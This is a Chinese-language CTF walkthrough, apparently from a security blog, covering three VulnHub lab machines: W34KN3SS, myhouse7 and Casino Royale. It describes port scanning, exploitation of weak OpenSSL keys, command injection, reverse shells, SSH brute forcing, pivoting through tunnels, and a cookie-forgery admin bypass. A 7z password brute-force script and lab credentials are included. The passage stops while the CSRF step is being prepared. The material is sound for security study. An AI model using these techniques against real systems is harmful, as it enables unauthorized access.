> 原文链接: https://www.anquanke.com//post/id/176287 


# 靶机渗透三部曲——W34KN3SS+myhouse7+Casino Royale


                                阅读量   
                                **275457**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">10</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p1.ssl.qhimg.com/t01450665a9d68a7ca9.jpg)](https://p1.ssl.qhimg.com/t01450665a9d68a7ca9.jpg)



## 前言

本文对三个web靶机进行渗透分析，由易到难，循序渐进，分享出来，共同交流学习。



## W34KN3SS

靶机地址：[Download](https://download.vulnhub.com/w34kn3ss/W34KN3SS.ova)

靶机直接扔到vmware里，然后查看目标靶机IP地址信息：

[![](https://p4.ssl.qhimg.com/t018eec771f3b9e1ad5.png)](https://p4.ssl.qhimg.com/t018eec771f3b9e1ad5.png)

上nmap查看靶机所开放的端口信息：

[![](https://p0.ssl.qhimg.com/t01d897cb0fa4c779fc.png)](https://p0.ssl.qhimg.com/t01d897cb0fa4c779fc.png)

可以看到22、80、443三个端口，首先查看80端口的web信息

[![](https://p4.ssl.qhimg.com/t019d749a6bdc5f503f.png)](https://p4.ssl.qhimg.com/t019d749a6bdc5f503f.png)

是apache的默认网页，没有发现有价值的信息，上wfuzz爆破一下站点的子目录：

[![](https://p0.ssl.qhimg.com/t01ec313f51c9c02abd.png)](https://p0.ssl.qhimg.com/t01ec313f51c9c02abd.png)

访问**blog**、**test**子目录，均没有发现很有价值的线索。

[![](https://p2.ssl.qhimg.com/t01d5dc1bfee79f9e4d.png)](https://p2.ssl.qhimg.com/t01d5dc1bfee79f9e4d.png)

再来回看端口扫描结果，在443端口的扫描结果中，观察到ssl-cert相关信息，将`weakness.jth`添加到本地hosts文件中，然后访问该域名：

[![](https://p1.ssl.qhimg.com/t01c74dd888a0f99c00.png)](https://p1.ssl.qhimg.com/t01c74dd888a0f99c00.png)

[![](https://p0.ssl.qhimg.com/t01a5a9ce80e5b12ea5.png)](https://p0.ssl.qhimg.com/t01a5a9ce80e5b12ea5.png)

爆破该域名的子目录：

[![](https://p5.ssl.qhimg.com/t0124eae7aa7e9019fd.png)](https://p5.ssl.qhimg.com/t0124eae7aa7e9019fd.png)

这里发现了比较敏感的提示信息**private**目录，访问子目录发现了两个重要的文件：

[![](https://p3.ssl.qhimg.com/t012271f7f1b2a9743c.png)](https://p3.ssl.qhimg.com/t012271f7f1b2a9743c.png)

两个文件的内容如下：

```
notes.txt:
this key was generated by openssl 0.9.8c-1

mykey.pub:
ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEApC39uhie9gZahjiiMo+k8DOqKLujcZMN1bESzSLT8H5jRGj8n1FFqjJw27Nu5JYTI73Szhg/uoeMOfECHNzGj7GtoMqwh38clgVjQ7Qzb47/kguAeWMUcUHrCBz9KsN+7eNTb5cfu0O0QgY+DoLxuwfVufRVNcvaNyo0VS1dAJWgDnskJJRD+46RlkUyVNhwegA0QRj9Salmpssp+z5wq7KBPL1S982QwkdhyvKg3dMy29j/C5sIIqM/mlqilhuidwo1ozjQlU2+yAVo5XrWDo0qVzzxsnTxB5JAfF7ifoDZp2yczZg+ZavtmfItQt1Vac1vSuBPCpTqkjE/4Iklgw== root@targetcluster
```

根据提示信息判断，0.9.8c-1版本openssl产生的key应该是存在可利用漏洞的：

[![](https://p0.ssl.qhimg.com/t01b910863897c30305.png)](https://p0.ssl.qhimg.com/t01b910863897c30305.png)

`searchsploit`搜索一下，如图所示，由于伪随机数生成器可预测，导致SSH会被暴力破解，查看漏洞利用脚本内的信息：

[![](https://p5.ssl.qhimg.com/t01e5267e439a096514.png)](https://p5.ssl.qhimg.com/t01e5267e439a096514.png)

根据描述，我们将`5622.tar.bz2`文件下载并解压，而后根据`mykey.pub`文件内的base64编码信息进行搜索：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t018d95e76ecf6a6bff.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t016cc2a049ea2773a1.png)

如图所示，成功搜索到对应的私钥信息，利用此凭证登录SSH

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01eeff673cf4680748.png)

拿到当前目录下`user.txt`的**flag**。工作进行到这里，并没有结束，因为靶机要求以root权限登录。因此需要继续进行～

在当前目录下还有一个code文件，是一个python编译后的文件。最直接的想法就是反编译。将code文件取回到本机，扔到[在线网站](https://python-decompiler.com/)进行反编译，结果如下：

[![](https://p1.ssl.qhimg.com/t015a56bff483b9e2e1.png)](https://p1.ssl.qhimg.com/t015a56bff483b9e2e1.png)

可以发现其貌似是一个登录凭证：

```
n30:dMASDNB!!#B!#!#33
```

尝试利用上述信息，成功获取root权限，并拿到`root.txt`的flag：

[![](https://p0.ssl.qhimg.com/t01c5f9969dc6301035.png)](https://p0.ssl.qhimg.com/t01c5f9969dc6301035.png)



## myhouse7

**靶机简介**

靶机链接：[https://thepcn3rd.blogspot.com/p/myhouse7.html](https://thepcn3rd.blogspot.com/p/myhouse7.html)

> 目标靶机上运行着多个docker container，靶机有2个Flag，每个container有3个Flag，一共20个Flag。Flag的格式如下：``{``{`tryharder:xxx`}``}``，其中xxx最多为4位数。目标靶机内的整体网络架构大致如下图所示：

[![](https://p1.ssl.qhimg.com/t01df021b4c3386d35b.png)](https://p1.ssl.qhimg.com/t01df021b4c3386d35b.png)

#### <a class="reference-link" name="%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"></a>基本信息搜集

首先`netdiscover`侦查靶机的IP信息

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01567a44dd9a760f4e.png)

然后，`nmap`扫描靶机的端口信息

[![](https://p1.ssl.qhimg.com/t0188e88b11b7ffefa2.png)](https://p1.ssl.qhimg.com/t0188e88b11b7ffefa2.png)

显然，靶机开放的端口包括：`22,25,443,8008,10000,20000`。上述端口扫描用的默认脚本，由于考虑到本靶机包含多个docker共20个Flag，为避免产生疏漏，进一步利用参数`-P1-65535`对所有端口进行遍历扫描。

结果，果然有意外收获，开放的端口还包括`8111,8112,8115`，而8111端口的扫描更是直接收获到一个Flag``{``{`tryharder:114`}``}``

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t016700e1334ce47885.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01925c6370cfe8982e.png)

针对上述开放的端口，可有针对性地开展下一步工作：
- 对22 ssh 端口尝试爆破
- 对各具体http的端口，寻找web的漏洞利用点
下面的行文将针对每一个container展开分析，而在真正的实践过程中，则是对搜集信息进行综合利用。

#### <a class="reference-link" name="443%20web%20container"></a>443 web container

web访问各端口的http服务，发现443端口指向如下页面，页面仅有简单的图片和文字，直接审源码，拿到一枚Flag，``{``{`tryharder:999`}``}``

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01e6a9aa0867fa46c5.png)

[![](https://p4.ssl.qhimg.com/t017cd8eced74934bfc.png)](https://p4.ssl.qhimg.com/t017cd8eced74934bfc.png)

然后，对该站点进行子目录爆破，可利用的工具有`gobuster`和`wfuzz`，此处使用后者，利用参数`--hc 404 --hl 0`，过滤掉404状态码的结果以及返回为空的结果。

[![](https://p0.ssl.qhimg.com/t01b7d562f3c0da6185.png)](https://p0.ssl.qhimg.com/t01b7d562f3c0da6185.png)

爆破结果如上图，可以观察到两个可疑的结果`f`和`flag`，然后又拿到2个Flag，``{``{`tryharder:217`}``}`,`{``{`tryharder:714`}``}``

[![](https://p3.ssl.qhimg.com/t01ab4ecbf1de34a9d7.png)](https://p3.ssl.qhimg.com/t01ab4ecbf1de34a9d7.png)

至此，针对此web container的3个Flag已全部拿到。

#### <a class="reference-link" name="20000%20web%20host"></a>20000 web host

访问20000端口的页面，直接在主页拿到一枚flag，``{``{`tryharder:1`}``}``此flag与后文一flag重复。

[![](https://p4.ssl.qhimg.com/t018a369964c8b3e0e4.png)](https://p4.ssl.qhimg.com/t018a369964c8b3e0e4.png)

根据其页面信息提示，该页面很有可能是检测其靶机中各container的运行状态，因而该web应该是位于靶机host的，而非docker，因此该站点应该是包含2个flag的。

那么，另一个flag藏在哪里呢？就在该页面中。。。隐藏的`input`，差点儿就漏过去了。。

[![](https://p5.ssl.qhimg.com/t0146b838507ad02f3b.png)](https://p5.ssl.qhimg.com/t0146b838507ad02f3b.png)

#### <a class="reference-link" name="8111%20web%20container"></a>8111 web container

[![](https://p3.ssl.qhimg.com/t0198976db3bc33d467.png)](https://p3.ssl.qhimg.com/t0198976db3bc33d467.png)

8111端口的web页面似乎没有重要信息，下面依然用`wfuzz`爆破8111端口的web

[![](https://p0.ssl.qhimg.com/t01f2cf1227d8edc6cd.png)](https://p0.ssl.qhimg.com/t01f2cf1227d8edc6cd.png)

`server-status`下发现的Flag在前文已经拿到：

[![](https://p1.ssl.qhimg.com/t01d0773952d2d58446.png)](https://p1.ssl.qhimg.com/t01d0773952d2d58446.png)

而图中的`index.php`则给了暗示，我们尝试扫描该站点下是否还存在其他的php文件，结果果然有收获：

[![](https://p5.ssl.qhimg.com/t011e6982e0c8530647.png)](https://p5.ssl.qhimg.com/t011e6982e0c8530647.png)

查看一下`b.php`和`c.php`的内容：

[![](https://p0.ssl.qhimg.com/t01405a43b2d801a2d5.png)](https://p0.ssl.qhimg.com/t01405a43b2d801a2d5.png)

其中`b.php`页面中的信息耐人寻味，其向`c.php`提交的`value="ls -lha /etc/backup"`，其`name=command`，似乎在暗示，`b.php`向`c.php`提交shell命令，而`c.php`返回结果。

[![](https://p1.ssl.qhimg.com/t018ee58b2fdc4d5090.png)](https://p1.ssl.qhimg.com/t018ee58b2fdc4d5090.png)

web访问页面，验证了我们上文的猜想。这里看到了`/etc/backup`目录下存在`flag.txt`文件，因此，上`burpsuite`修改`value`的命令来拿`flag:`{``{`tryharder:1`}``}``。

[![](https://p0.ssl.qhimg.com/t01581fbc0744a416cf.png)](https://p0.ssl.qhimg.com/t01581fbc0744a416cf.png)

继续修改`command`，看到在该网站的根目录下存在着另一个flag文件，成功拿到该container的第三个flag``{``{`tryharder:511`}``}``<br>[![](https://p4.ssl.qhimg.com/t01a3d4bf1e978ec8d1.png)](https://p4.ssl.qhimg.com/t01a3d4bf1e978ec8d1.png)

#### <a class="reference-link" name="8115%20web%20container"></a>8115 web container

访问主页面，看到一句充满暗示性的语句：`I stored a backup in /timelock/backup`

[![](https://p2.ssl.qhimg.com/t0178b9d44cd0508e46.png)](https://p2.ssl.qhimg.com/t0178b9d44cd0508e46.png)

果然在其目录下发现了不得了的东西：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01f69a95bf97aa7e36.png)

继续浏览其他子页面，发现了`timeclock`页面，需要登录口令，猜测其是否存在弱口令的情况。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01eaa3311c89895597.png)

将`all.zip`文件下载回来，在其内的`timeclock.sql`内发现了如下sql语句

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t0177a4a081b947d8c0.png)

猜测可能为弱口令`admin`，果然成功登录，在其内部发现了一用户列表，包含了用户名和密码，各账号的用户名与口令相同，其中`admin、larryjr、heather`三个用户在后续会用到。

[![](https://p5.ssl.qhimg.com/t01b0ee101e493be6a8.png)](https://p5.ssl.qhimg.com/t01b0ee101e493be6a8.png)

先暂时放下数据库中的信息，回到`browse_backups.php`页面，其提示信息如下，暗示可执行shell：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0173c365363fa2f6a1.png)

查看靶机上是否`perl、python、Ruby`等环境，以便构造反向shell。最终，利用`python3`成功实现反向shell。

[![](https://p0.ssl.qhimg.com/t013e4d967bfa0d0141.png)](https://p0.ssl.qhimg.com/t013e4d967bfa0d0141.png)

如此以来~我们便可以干很多事情了~

由于我们已经知道了flag的字符串格式，我们直接在web目录下对文件内容进行字符串匹配：

```
grep -nr tryharder *
```

结果真的就如我们所愿…拿到了该web docker下的三个全部flag。

[![](https://p3.ssl.qhimg.com/t01e03bf164697dde6c.png)](https://p3.ssl.qhimg.com/t01e03bf164697dde6c.png)

#### <a class="reference-link" name="mysql%20db%20container"></a>mysql db container

[![](https://p3.ssl.qhimg.com/t0105ed8f9bb50d5420.png)](https://p3.ssl.qhimg.com/t0105ed8f9bb50d5420.png)

上文的``{``{`tryharder:737`}``}``位于`/var/www/html/anchor/config/db.php`文件中，猜测其可能是web的数据库配置文件，在文件具体内容中，找到了数据库的信息

```
hostname -&gt; 172.31.20.10
port -&gt; 3306
username -&gt; root
password -&gt; anchordb
```

因此，下一步工作尝试对`mysql`的`container`进行渗透

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0157f0491c2ee48643.png)

当前web环境中并不包含Mysql环境，因此先通过`wget`在web环境中导入mysql环境，然后登录到mysql数据库中

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t0189518b553d80047a.png)

分别在`flag`数据库的`flag`表和`anchor`数据库的`anchor_users`表中拿到两个flag

[![](https://p1.ssl.qhimg.com/t01a5e5333a7b515ac7.png)](https://p1.ssl.qhimg.com/t01a5e5333a7b515ac7.png)

[![](https://p1.ssl.qhimg.com/t013ff66aca02a6dea4.png)](https://p1.ssl.qhimg.com/t013ff66aca02a6dea4.png)

数据库中一顿翻江倒海之后，并没有找到第三个flag，猜测其可能不再数据库表项中。尝试利用数据库注入的`LOAD_FILE`来查找mysql container 中是否存在类似于flag的文件。

[![](https://p2.ssl.qhimg.com/t01a03beca693497547.png)](https://p2.ssl.qhimg.com/t01a03beca693497547.png)

至此，关于mysql db container的3枚flag已收齐。

#### <a class="reference-link" name="smb%20container"></a>smb container

至此，好像没有其他可利用的信息了。因此，尝试对22端口的ssh进行爆破，而爆破所用的字典首先想到的是在8115端口的web中发现的`admin、larryjr、heather`，利用hydra进行爆破：

[![](https://p0.ssl.qhimg.com/t01f97b9a9ac701479b.png)](https://p0.ssl.qhimg.com/t01f97b9a9ac701479b.png)

吃惊脸~拿到了ssh的账户`admin,admin`。登录到靶机后的信息如下图，admin的权限为all，这意味着我们可以彻底控制目标靶机，甚至查看其上运行的各个docker container的状态。这应该是靶机创作者不小心的失误，而非靶机创作者的初衷。因此，后续的过程，我们将会控制权限的使用。

[![](https://p2.ssl.qhimg.com/t01d33d44e6dc1e6cfb.png)](https://p2.ssl.qhimg.com/t01d33d44e6dc1e6cfb.png)

查看host上的网络信息，发现其内部存在多个子网段：

[![](https://p0.ssl.qhimg.com/t0192ca371c301dacb7.png)](https://p0.ssl.qhimg.com/t0192ca371c301dacb7.png)

上nmap对各网段扫描，寻找可利用的信息，在对`172.31.30.0/24`的网段进行扫描时，发现如下信息：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t014743a447934cad72.png)

而139端口、445端口是SMB协议的端口，为对这两个端口进行深入的分析，先在本地到其端口之间建立两条ssh隧道：

[![](https://p3.ssl.qhimg.com/t0154313898f729c882.png)](https://p3.ssl.qhimg.com/t0154313898f729c882.png)

[![](https://p1.ssl.qhimg.com/t01075dc4ae7ecffdc8.png)](https://p1.ssl.qhimg.com/t01075dc4ae7ecffdc8.png)

则下一步对本地的139和445端口的操作，会被映射到靶机内网的对应端口上。

下面用smbmap对本地进行扫描，虽然看起来有些奇怪，但由于ssh隧道的存在，最终扫描的是172.31.30.24机器。

[![](https://p2.ssl.qhimg.com/t01d15ce45fa43c0cce.png)](https://p2.ssl.qhimg.com/t01d15ce45fa43c0cce.png)

在445端口上发现了两个Disk信息: **users**和**companyInfo**，但此时还没有相关权限，需要相关的用户名和口令。这里再次想到了前文收集到的`heather、larryjr`两个用户。尝试一下，果然正确。

[![](https://p3.ssl.qhimg.com/t01569c9b3abd07717a.png)](https://p3.ssl.qhimg.com/t01569c9b3abd07717a.png)

用smb客户端`smbclient`分别登录到`users`和`companyInfo`中。

[![](https://p5.ssl.qhimg.com/t0172b0603157020279.png)](https://p5.ssl.qhimg.com/t0172b0603157020279.png)

[![](https://p3.ssl.qhimg.com/t012bfda8dced4a2e10.png)](https://p3.ssl.qhimg.com/t012bfda8dced4a2e10.png)

如上图所示，再次拿到了两个Flag。而第三枚flag，根据`hint.txt`提示，是`moreinfo.7z`文件的解压密码，格式满足``{``{`tryharder:xx`}``}``，xx为两位数。利用的思路很清晰：穷举爆破，利用如下代码，最终拿到的flag为``{``{`tryharder:77`}``}``：

```
import os
for i in range(101):
    passwd = "`{``{`tryharder:%02d`}``}`"%(i)
    cmd = ("7z e -aoa -p`{`0`}` moreinfo.7z").format(passwd)
    r = os.popen(cmd)
    info = r.read()
    if info.find("Errors") == -1:
        print passwd
```

#### <a class="reference-link" name="24%20ssh%20container"></a>24 ssh container

在靶机host上再次对172.31.20.0/24网段进行扫描：

[![](https://p0.ssl.qhimg.com/t01b9b51e7c3d43106c.png)](https://p0.ssl.qhimg.com/t01b9b51e7c3d43106c.png)

发现在172.31.20.194的地址的24端口上运行着一个未知服务，尝试ncat连接过去，发现其实运行的是ssh服务：

[![](https://p0.ssl.qhimg.com/t01094dc69ee1b2cd6d.png)](https://p0.ssl.qhimg.com/t01094dc69ee1b2cd6d.png)

同样，为方便后续操作，在本地20024端口与172.31.20.194:24间建立一条ssh隧道：

[![](https://p0.ssl.qhimg.com/t016be42bc82aa38486.png)](https://p0.ssl.qhimg.com/t016be42bc82aa38486.png)

[![](https://p1.ssl.qhimg.com/t01b8e633b8af668131.png)](https://p1.ssl.qhimg.com/t01b8e633b8af668131.png)

对于此ssh端口，之前搜集掌握的信息较少，因此只能采取爆破的方法，将前文收集的各类用户名和口令汇集成字典进行爆破：

[![](https://p0.ssl.qhimg.com/t01adc0b82a3f33b0a3.png)](https://p0.ssl.qhimg.com/t01adc0b82a3f33b0a3.png)

成功爆破，ssh登录本地的20024端口，实质上是登录到靶机内网172.31.20.194:24的ssh服务，登录后就发现了两枚flag。

[![](https://p5.ssl.qhimg.com/t0155c7eb0ecf43c529.png)](https://p5.ssl.qhimg.com/t0155c7eb0ecf43c529.png)

ssh登录到内网机器后，相当于我们已经掌控了对应机器，为简化寻找第三枚flag的操作，直接用grep搜索匹配特定格式的字符串。

[![](https://p2.ssl.qhimg.com/t01feaae4aff0acdffa.png)](https://p2.ssl.qhimg.com/t01feaae4aff0acdffa.png)



## casino royale

上面两个靶机还稍显简单，下面来看casino royale靶机，听这名字“皇家赌场”，还蛮有气势的。

靶机地址：[Download](https://download.vulnhub.com/casinoroyale/CasinoRoyale.ova)

老套路，上来查看靶机IP信息，然后扫描端口信息：

[![](https://p0.ssl.qhimg.com/t014fe8a8962a5129c3.png)](https://p0.ssl.qhimg.com/t014fe8a8962a5129c3.png)

[![](https://p3.ssl.qhimg.com/t018218e538359134cf.png)](https://p3.ssl.qhimg.com/t018218e538359134cf.png)

开放了4个端口：21-ftp，25-smtp，80-http，8081-http

由80web端口入手：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01589116229e532903.png)

页面上是个so cool的背影….没有重要信息，进行子目录爆破：

[![](https://p0.ssl.qhimg.com/t01a03349366077c00f.png)](https://p0.ssl.qhimg.com/t01a03349366077c00f.png)

看到有`index.php`和`phpmyadmin`等线索，首先分析前者：

[![](https://p1.ssl.qhimg.com/t0158c1bd76d4c36fa2.png)](https://p1.ssl.qhimg.com/t0158c1bd76d4c36fa2.png)

由上图可以观察到，该页面提到了`pokermax poker league software`，自然想到查看其是否存在已知的可利用漏洞，`searchsploit`结果如下：

[![](https://p0.ssl.qhimg.com/t015dba75badb630e5f.png)](https://p0.ssl.qhimg.com/t015dba75badb630e5f.png)

果然有漏洞，具体漏洞信息如下图，其表明存在着不安全的Cookie处理流程，可实现以admin登录：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01c5bc87244ea809f0.png)

根据漏洞提示，直接访问`/pokeradmin/configure.php`页面，会跳转到登录界面：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t019239141462955b5d.png)

在实际的摸索过程中，发现这一步可采用2种方法：

方法一：利用poker League-insecure cookie handling 直接绕过登录

利用WEB开发者工具的控制台，通过`javascript:document.cookie="ValidUserAdmin=admin"`<br>
绕过`/pokeradmin/index.php`，直接以管理员身份跳转到`/pokeradmin/configure.php`页面，在页面内直接观察到管理员口令信息：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t0103ed1ea4d00ee811.png)

方法二：利用`sqlmap`尝试获取数据库信息

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t014858669400197644.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01ffe765c0f5316c52.png)

发现数据库为：**pokerleague**，尝试从数据库中获取管理员登录信息

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01ad20bc0e7de2b3d4.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t018267870d6d0c9422.png)

如图所示，从数据库中拿到的管理员信息与方法1中的信息是一致的。

继续进行～

在管理员的`configure.php`页面内，根据提示，将`casino-royale.local`添加到本地的`/etc/hosts`文件内：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t0166c98b23c7459cb1.png)

继续在管理员页面内寻找信息，在`Manage Players`页面内看到多个用户的信息，其中`Valenka`用户具有email链接，并在其用户信息内发现了新的链接：`/vip-client-portfolios/?uri=blog`

[![](https://p3.ssl.qhimg.com/t01f988fd57bbd7f907.png)](https://p3.ssl.qhimg.com/t01f988fd57bbd7f907.png)

访问新链接，发现其为**Snowfox CMS**

[![](https://p3.ssl.qhimg.com/t0173edac262da3cc42.png)](https://p3.ssl.qhimg.com/t0173edac262da3cc42.png)

在页面内发现了重要的提示信息，要求向`valenka`发送邮件信息。

先来查看一下关于**Snowfox CMS**的信息，`searchsploit`找到该架构的漏洞和利用相关信息，为CSRF跨站请求伪造漏洞，利用该漏洞可获得管理员权限账户：

[![](https://p2.ssl.qhimg.com/t012d40b9a64f9a9c07.png)](https://p2.ssl.qhimg.com/t012d40b9a64f9a9c07.png)

根据提示，在本机`/var/www/html`路径下新建`1.html`文件，将上述内容拷入其中，并对部分内容进行修改如下：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t0100e4f8dfa573bf7e.png)

然后开启本机的apache服务。

根据靶机**Snowfox CMS**页面的提示信息，下一步利用25端口向靶机发送邮件信息。

